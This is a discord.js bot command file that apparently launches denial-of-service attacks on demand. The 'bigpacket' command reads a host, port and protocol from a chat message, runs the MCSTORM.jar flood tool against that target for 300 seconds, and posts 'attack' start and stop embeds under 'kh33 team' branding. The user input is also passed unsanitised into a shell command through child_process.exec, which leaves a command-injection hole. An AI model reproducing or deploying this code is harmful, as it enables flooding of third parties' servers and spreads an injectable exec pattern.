const Discord = require("discord.js");

exports.run = async (client, message, args) => {

const host = message.content.split (" ")[1]
const port = message.content.split (" ")[2]
const protocol = message.content.split (" ")[3]
const ayarlar = require('../ayarlar.json');
var room = ayarlar.commandroom;
const roleName = message.member.roles.cache.find(r => r.name === "[ᴀᴛᴛᴀᴄᴋ-ʙᴀsɪᴄ]")

if (message.channel.id != room) {
	return;
  }
  
if (roleName) {
    const embed1 = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('Warning')
	.setDescription("`Crack server only`")
	message.channel.send(embed1);
	return;
  }

if(!args[0]) {
	const embed1 = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('Command')
	.setDescription("`attack command $bigpacket <Host> <Port> <Protocol>`")
	message.channel.send(embed1);
	return;
	}

if(!args[1]) {
	const embed1 = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('Warning')
	.setDescription("`Please Send valid Commnds !`")
	message.channel.send(embed1);
	return;
	}

if(!args[2]) {
	const embed1 = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('Warning')
	.setDescription("`$bigpacket <IP> <Port> <Protocol>`")
	message.channel.send(embed1);
	return;
	}

var exec = require('child_process').exec
exec(`java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -jar MCSTORM.jar ${host}:${port} ${protocol} bigpacket 300 -1`, (error, stdout, stderr) => {
});
setTimeout(function(){ 
    console.log('Cuộc tấn công đã dừng lại ID Discord:' +  message.guild.id)


const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('🔥 **kh33 team V1.0** 🔥')
	.setTimestamp()
	.setDescription("*► The attack has stopped 🛑**")
	.setFooter('© dev 1.5mq.', client.user.avatarURL)
	.setTimestamp()
	.setThumbnail("")
 message.channel.send(embed);
 }, 120000); //time in milliseconds
var gifler = ["https://i.giphy.com/media/v1.Y2lkPTc5MGI3NjExMWFwYWdmaHhhbjZkMTZrdHF2bm4yd24xeTk5OTdqczd5Z2gwdzdqZiZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/zzklOEpLxYyPptvDM9/giphy.gif", "https://i.giphy.com/media/v1.Y2lkPTc5MGI3NjExMWFwYWdmaHhhbjZkMTZrdHF2bm4yd24xeTk5OTdqczd5Z2gwdzdqZiZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/zzklOEpLxYyPptvDM9/giphy.gif", "https://i.giphy.com/media/v1.Y2lkPTc5MGI3NjExMWFwYWdmaHhhbjZkMTZrdHF2bm4yd24xeTk5OTdqczd5Z2gwdzdqZiZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/zzklOEpLxYyPptvDM9/giphy.gif" , "https://i.giphy.com/media/v1.Y2lkPTc5MGI3NjExMWFwYWdmaHhhbjZkMTZrdHF2bm4yd24xeTk5OTdqczd5Z2gwdzdqZiZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/zzklOEpLxYyPptvDM9/giphy.gif"];
    var randomgif = gifler[Math.floor((Math.random() * gifler.length))];
console.log('Một cuộc tấn công khởi chạy ID Discord:' +  message.guild.id)


const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('🔥 **kh33 team V1.0** 🔥')
	.setTimestamp()
	.setDescription("**User**: `" + message.author.username + "` \n **Host**: `" + host + "` \n **Port**: `" + port + "` \n **protocol**: `" + protocol + "`\n \n **🤖 Methods**: `bigpacket` \n **🕒 Seconds**: `300`")
	.setFooter('© dev 1.5mq.', client.user.avatarURL)
	.setTimestamp()
	.setImage(randomgif)
	.setThumbnail("")
 message.channel.send(embed);
  }

exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['bigpacket'],
  permLevel: 0
}

exports.help = {
  name: 'bigpacket',
  description: 'Özel',
  usage: 'bigpacket'
}